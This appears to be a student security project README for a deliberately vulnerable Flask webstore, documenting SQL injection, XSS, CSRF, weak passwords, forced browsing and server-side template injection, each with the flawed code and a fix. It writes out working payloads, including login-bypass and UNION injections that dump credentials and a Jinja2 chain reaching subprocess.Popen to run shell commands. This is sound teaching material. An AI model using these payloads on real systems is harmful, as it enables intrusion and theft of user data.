# SIOProject_1
Repository for SIO 2023/2024 1st Project

# Project Members

- **Diogo Marto   - 108298**
- **Tiago Pereira - 108546**

## Project Description

This project theme is "DETI memorabilia at the University of Aveiro". The aim is to develop a functional webstore with concealed vulnerabilities that are not apparent to casual users but can be exploited to compromise the system. As required, we present both a flawed and a corrected version of the shop, detailing how these vulnerabilities are explored and their impact.

## Explored CWE's

##      BaseImproper Neutralization of Special Elements used in an SQL Command ('SQL Injection')
##      Improper Neutralization of Input During  Web Page Generation ('Cross-site Scripting') 
##      Weak Authentication
##      Direct Request ('Forced Browsing')
##      Improper Neutralization of Special Elements Used in a Template Engine

# Installation

You need to have docker installed and the docker daemon running.
Inside the folders app or app_sec run the following command to create a docker image:

```
$ docker build -t [name_of_image] . 
```

Note you need to make this for both app and app_sec with differnt names for the image.

# Execution

You need to have docker installed and the docker daemon running.
Run the following command

```
$ docker run -p [desired_port_outside]:5000 [name_of_image]
```

Note make sure desired port is not being used and name of image is the ones created on Execution section.

## License

[MIT](https://choosealicense.com/licenses/mit/)

# Analysis CWE-89: SQL Injection

## Introduction 

SQL injection attacks represent a serious threat to any database-driven site.The methods behind an attack
are easy to learn and the damage caused can range from considerable to complete system compromise.

## Vulnerabilities 

### Basic Injection to Bypass Login 

#### Example

We have a simple login form on http://127.0.0.1:5000/auth/login and we also have an admin user called ```admin_user```. But this form is vulnerable to a simple sql injection.
By simply writing ``` admin_user'-- // ``` on the username and a random string for the password we can login to the admin account.
![image](static/8dcde9c2-ba10-44f5-bca5-59aa0b774c4a.png)
![image](static/43ef5739-baf8-465e-b4bf-8242cb512393.png)

#### Weak code 
![image](static/a8f3bd7b-c2eb-4345-9fc6-a4611eed8015.png)

We are making the sql command based on string concatenation which allows to do a simple sql injection. ( Blueprints/auth.py login() function )

#### Fix 

- We can use a builtin functionality from the sqlite3 python library that allows us to build safe sql commands very simply.

![image](static/a7d964b2-04a3-43e5-b2d1-dc7d564e1b6a.png)

- We can refactor the logic of our login so that it isnt vulnerable to this attack. In this example the ```check_password_hash()``` must always run and cant be skipped.

![image](static/18d2de35-ad85-458d-85da-8056e5100270.png)

- We could also make an udf that would achieve the same thing that our functionality from sqlite3 , separation between arguments and the sql command.

### Basic injection on product listing to get names of all users

#### Example

We can search for products using a string but this field is vulnerable to sql injection.

![image](static/c7f1df89-f433-4924-b87a-d081579c61fe.png)

```' ORDER BY 4 -- //```
We can check that is vulnerable by ordering the products in a different order also we can see that we can only order up to the 4th collumn.
After we know that we are working with 4 collumns we can add information to the product listing. For example with ```' UNION SELECT 1,2,3,4,5 -- // ```

![image](static/0be2f68c-5dfa-4757-a14a-00278925e310.png)

But we can cause a bit more damage with ```' UNION SELECT  Username , ID , Password , Role FROM User ORDER BY 2 -- //```

![image](static/4436cba5-efa7-4342-b766-a889cba4e250.png)

Which gives us a list of the username and the corresponding encrypted password.

#### Weak code

![image](static/edf2f1ae-6e16-43c7-8837-9ce45723f4a3.png)

Once again we are building our SQL commands using concatenation of strings. ( Blueprints/shop.py products() function ) 

#### Fix 

- We can deploy a similar strategy used above and use the sqlite3 python functionality to prevent SQL injection.

![image](static/d6a7588f-aea9-4dbb-bd32-6aff9352de8e.png)

![image](static/63218a15-91f2-41fd-8a16-f4058e310b31.png)

### SQL Second order attacks

#### Example

When register our Username can be anything due to that we can store an unsanitized piece of SQL. Like ``` admin_user' -- // ```

![image](static/c9991a07-9f17-43e4-bdec-4ac5c87c17c5.png)

Now we can login into this new account , but funnily enough since our login is vulnerable to SQL injections we cant even login to this account since instead it will login to the ```admin_user```.
So we have a route ```auth/login/safe``` that doesnt have SQL injection we can login to ``` admin_user' -- // ```

![image](static/a61e58b4-3ccd-4dfc-817a-dd877e1a4cf7.png)

![image](static/4cf4159b-1373-4f47-af71-ddcb6112980d.png)

Now if we go to the profile we will see something interesting.

![image](static/e499a204-51f0-455e-92ec-92b2eed1f307.png)

We see the profile of the ```admin_user``` !

#### Weak code

![image](static/f5bb1242-3bb4-480e-ab38-8255a82c7686.png)

On Blueprints/shop.py on the function profile() we have this segment of code. On ```g.user``` its stored our current session that as all the some details about the user namely ```Username```.
When we store an unsanitized piece of SQL in ```Username``` the resulting SQL command built from concatenation will be unsafe in our case will give us the profile for the ```admin_user```.

#### Fix

- We can once again use the builtin functionality from the sqlite3 python library that allows us to build safe sql commands and even if the ```Username``` is unsafe it still be treated in a manner thats safe. In the same vein we can build the SQL based on something the user doesnt have control namely ```ID``` which is generated by the database.
  
![image](static/81c5ab0f-54bb-44df-a7e5-2252ab7e3669.png)

![image](static/f4622177-1099-4336-a44e-3f040ad2d932.png)

- Another fix is proper validation of what we store, in our case what we store on ```Username```. We can assume that ```Username``` can only be alphanumeric for example.

![image](static/27806b90-ac35-448d-8820-6a09d07d554e.png)

On Blueprints/auth.py register() function

![image](static/595158a1-143e-4277-b317-d9c413102f46.png)

### Blind Injection

#### Example 

We can search for products using a string but this field is vulnerable to sql injection.

![image](static/a6a9ece3-6a6f-4ef7-be78-ba782dff48b1.png)

![image](static/3913254e-0de5-439d-8e91-0d8e8f717923.png)

We can see that products will only appear when on ```' AND TEST -- // ``` the ```TEST``` is true. 
For example we can use ```' AND ( select COUNT(*) from User ) > NUM  -- //``` to see if the number of users is superior to ```NUM```
And by doing some queries we can find exact amount.
- ```' AND ( select COUNT(*) from User ) > 50  -- //``` is False.
- ```' AND ( select COUNT(*) from User ) > 25  -- //``` is False.
- ```' AND ( select COUNT(*) from User ) > 12  -- //``` is True.
- ```' AND ( select COUNT(*) from User ) > 18  -- //``` is True.
- ```' AND ( select COUNT(*) from User ) > 21  -- //``` is False.
- ```' AND ( select COUNT(*) from User ) > 20  -- //``` is True.
So we get that we have 21 users.

#### Weak code

![image](static/edf2f1ae-6e16-43c7-8837-9ce45723f4a3.png)

Once again we are building our SQL commands using concatenation of strings. ( Blueprints/shop.py products() function ) 

#### Fix 

- We can deploy a similar strategy used above and use the sqlite3 python functionality to prevent SQL injection.

![image](static/d6a7588f-aea9-4dbb-bd32-6aff9352de8e.png)

![image](static/d80a84ab-84c0-4cf9-83cf-80c55ab47923.png)

# Analysis CWE-79: XSS

## Introduction
XSS attacks exploit vulnerabilities within Web interactions where an attacker performs indirect actions
against Web clients through a vulnerable Web application. The primary result is that some external code is
injected into the victim’s web browser and will be executed. All existing context, including valid cookies, as
well as computational resources of the victim become available to the attacker.

## Vulnerabilities 

### Reflected XSS Attack

#### Example
We can search for products based on a url , i.e http://127.0.0.1:5000/products?minPrice=5&maxPrice=40&input=&category=Drinkware . 
But we can exploit this to do a reflected XSS attack , the field of category is rendered on the page by changing it we can inject unwanted code in the website.

This link, http://127.0.0.1:5000/products?minPrice=5&maxPrice=40&input=&category=Drinkware%3Cscript%3Ealert(%22Hellod%22)%3C/script%3E is compromised
when the page loads it shows and a popup saying "Hello". 
![image](static/30e5f5fb-f7c1-4c91-8061-aece1169c217.png)

#### Weak code

![image](static/c9d5a5f8-d6bd-4819-bdf4-b9a1aafde750.png)

In this piece of code we assume that category is safe so it can be treated has html. ( templates/products.html )

Also on the function products() on Blueprints/shop.py we never validate if the category field is an existing one or if it just garbage.

#### Fix 

- If we omit the safe tag jinga2 ( our template engine ) will assume that the input is unsafe and only treat it has text.

![image](static/b1c90437-3c9e-4f99-ba53-a23c40f1a128.png)

![image](static/2d845765-6f1e-40a3-989c-1564e4fa3509.png)

- If we validate if the category exists we can on the server indicate correct steps to fix the problem.

![image](static/827a3648-83a7-41d1-aaba-62706fd6899d.png)

![image](static/55a4e7a9-9c68-4497-a5ca-62f2c1ac4696.png)


### Stored XSS Attack

#### Example

We can write reviews for a product.

![image](static/a9d6e9f7-dd3a-4c1d-9656-3f67922705ca.png)

But we can insert a malicious payload in the review that will then be stored on the server. Users then accessing this webpage will render the malicious payload.

![image](static/a66876dc-7e6e-4946-b8f1-f533da1035f9.png)

After we load the page again we get:

![image](static/3d10f1d8-cd73-4fa1-8b4a-212b4fd55beb.png)

#### Weak code

![image](static/1fc178b6-ef97-4a10-831b-145e12385e66.png)

We assume that the review is safe so the contents of it are treated like html.

Also we dont check on the server side if the review migth have malicious code.

#### Fix 

- Just omit the safe tag and the review will only be treated as text.
![image](static/c53ecf37-a7fa-4fff-b0c6-ac66378aedab.png)

![image](static/dc2f727c-95ac-4234-9367-6e4c673ef5fe.png)

- We could also parse the review and check if it has any potencial malicous payload and reject it but for our case we assumed that the review is only text so this is uneccesary and just removing the safe tag is enough.

###  CSRF Attack

#### Example

![image](static/6f58765f-a5a1-44b0-9935-1e79b1ead970.png)

We can also target different servers using an XSS attack in this example we use the image tag to make a request to a server with the credentials of a user who visits the page with the malicious review.

![image](static/1326ef61-d4ad-4535-9907-d1a46945f880.png)

As we can see a GET request to ```https://vulnerable-bank.com/transfer.jsp?amount=1000&to_nib=12345300033233``` was sent and a normal user migth have been unware of this.

#### Fix 

- Don´t allow stored XSS Attack and reflected XSS Attack with the strategies diccussed above.

- Enable CORS or a secure Content Security Policy so that the browser knows what to not load.

![image](static/a4874939-1a63-42cb-82de-2a54a16df10b.png)

# Analysis CWE-1390: Weak Authentication

## Introduction
It's common for users to prefer the definition and use of weak password, i.e., sequences, common words, etc... Why is that? It's pratical and easy to remember. But that provides a perfect environment for credentials theft, as it is easy to break those credentials
with a simple approach... Brute force.

## Vulnerability code:

In auth.py, when we handle the definition and change of a password, no verification to its complexity is being made, allowing for the insertion of weak passwords.

![images](static/weakPassword.png)

## Exploit

Consider the following simple script in python, present in the bruteforce.py file:
![images](static/bruteforce.png)

**Note:** We are using a github document, stored in "10-million-password-list-top-10000.txt"(obtained from: https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt)

We have a user called Weak. He uses a very basic password. Through brute force, fetching from a common password database we we're able to find it's password. It was "potato":

![images](static/foundPassword.png)


## Solution?

To solve this problem we can take a very simple approach. Enforce strong passwords through password validation. To achieve this, we created a function that checks if the password is acceptable according to the following requirements:
 **-> have a mix of uppercase and lowercase letters**
 **-> have at least one digit**
 **-> have at least one special character**
 **-> have a minimum length of 8 characters**

**Secure Code:**

We validate:
![images](static/validateFunction.png)

And act accordingly:
![images](static/validatePassword.png)

# Analysis CWE-425:Forced Browsing

## Introduction
Imagine being able to access classified information without the necessary credentials with the excuse of "I want to!". As naive as it sounds, thats precisely what Forced Browsing stands for. It envolves manipulating front-end elements to access whats not supposed to be accessed.

## Vulnerability code:

In shop.py when we handle the profile route, we consider the username as input parameter passed through the URL. That allows the external world to manipulate and forge a fake identity, accessing other users sensible information(such as billing).

![images](static/nameWeak.png)

## Exploit

We can manage the URL to access the information about whoever we want to. Username information can be obtained through other methods, such as fishing and pool of common usernames. Some examples of this exploit:
![images](static/name1.png)

![images](static/name2.png)

We have done it all without the need of any type of authentication!

## Solution?

To solve this problem we can take a very simple approach. Pass the username variable, which is constant through a session as as internalized variable, not allowing front-end manipulation of sensible data accessors.

**Secure Code:**

We use the internal variable g.user["Username"]:
![images](static/nameStrong.png)

And the URL has no longer the name parameter:
![images](static/name3.png)

# Analysis CWE-1336: Improper Neutralization of Special Elements Used in a Template Engine

## Introduction 
Many web applications use template engines that allow developers to insert externally-influenced values into free text or messages in order to generate a full web page, document, message, etc. Such engines include Twig, Jinja2, Pug, Java Server Pages, FreeMarker, Velocity, ColdFusion, Smarty, and many others - including PHP itself. Some CMS (Content Management Systems) also use templates.

Template engines often have their own custom command or expression language. If an attacker can influence input into a template before it is processed, then the attacker can invoke arbitrary expressions, i.e. perform injection attacks. For example, in some template languages, an attacker could inject the expression "{{7*7}}" and determine if the output returns "49" instead. The syntax varies depending on the language.

We our case we are using Jinja2 to generate this templates.

## Example

We can search for products based on a url , i.e ```http://127.0.0.1:5000/products?minPrice=5&maxPrice=40&input=&category=Drinkware``` . But we can exploit this since our category field is vulnerable to SSTi.
The link ```http://127.0.0.1:5000/products?minPrice=5&maxPrice=40&input=&category={{2*2}}``` returns the following result.

![image](static/81135b32-37f2-4e2c-ad74-237fff2f3e06.png)

As we can see the category is 4 the result of 2*2. But this raises the question who did this calculation and why? The answer is that the server did , so that means that we are executing code on the server and the server ran the code for the calculation because ```{{ }}``` signals to Jinga2 to render something that it in our case the result of 2\*2.
If we try the link ```http://127.0.0.1:5000/products?minPrice=5&maxPrice=40&input=&category={{print("Hi")}}``` we will see something curious.

![image](static/e410f795-abcf-4bfe-bc9e-1eaca2c0e50e.png)

This error is the result of the template engine running in a sandbox where we cant do function calls directly i.e we cant do ```print("Hi")```.
So what do we have access to? We at least have access to numbers as we show above , but also strings , list , dict , tuple , some variables like config , request .

```http://127.0.0.1:5000/products?minPrice=5&maxPrice=40&input=&category={{%20config%20}}``` returns the following result.

![image](static/f2ed6d6b-6e34-4d5a-848e-b0b83b6cf40a.png)

In here we have access to something we probably shouldnt have, namely 'SECRET_KEY': 'dev'.

```http://127.0.0.1:5000/products?minPrice=5&maxPrice=40&input=&category={{%20dict.__base__.__subclasses__()%20}}``` returns the following result.

![image](static/3b00e088-2795-453d-ae84-925a4d0c3d28.png)

What happened here is that we are running this piece of code ```dict.__base__.__subclasses__()```. ```dict``` is a class and ```dict.__base__``` returns the base class of ```dict``` which is ```Object```. Then we basicly do ```Object.subclasses()``` which returns a list of all classes ( since all classes come from the ```Object``` class). And this has give us the opportunity to access hundreds of new classes and functions in those classes , and have some fun with them. ```{{dict.__base__.__subclasses__()[351]}}``` is gonna give us ```<class 'subprocess.Popen'>``` which spawn some process. ( the index to find this class may vary )

```http://127.0.0.1:5000/products?minPrice=5&maxPrice=40&input=&category={{dict.__base__.__subclasses__()[351](%22ls%20%22,shell=True,stdout=-1).communicate()[0].strip()}}```

Lists the file on the directory with ```ls```.

![image](static/0d2e307a-cb52-4064-af3a-f7c59ddf43f7.png)

```http://127.0.0.1:5000/products?minPrice=5&maxPrice=40&input=&category={{dict.__base__.__subclasses__()[351](%22cat%20__init__.py%22,shell=True,stdout=-1).communicate()[0].strip()}}```

Shows the contents of ```__init__.py``` which is source code of our website.

![image](static/b29ae7e0-eeb9-423e-861a-06937e28156c.png)

At this point we have access to ```bash``` commands and we can go some damage to the server.

## Weak code

![image](static/f18d3a42-f402-4011-a008-cafd5530d711.png)

On this line we are calling rendering on category as a template but we never check if category is safe to render().

## Fix 

- Category shouldnt be rendered as a template it should be only treated as text to inject in some template, never a template.

![image](static/f427b211-2250-44d1-a925-e07b80728718.png)

- If we really need to render Category has a template we could also validade that category is something safe to render. 


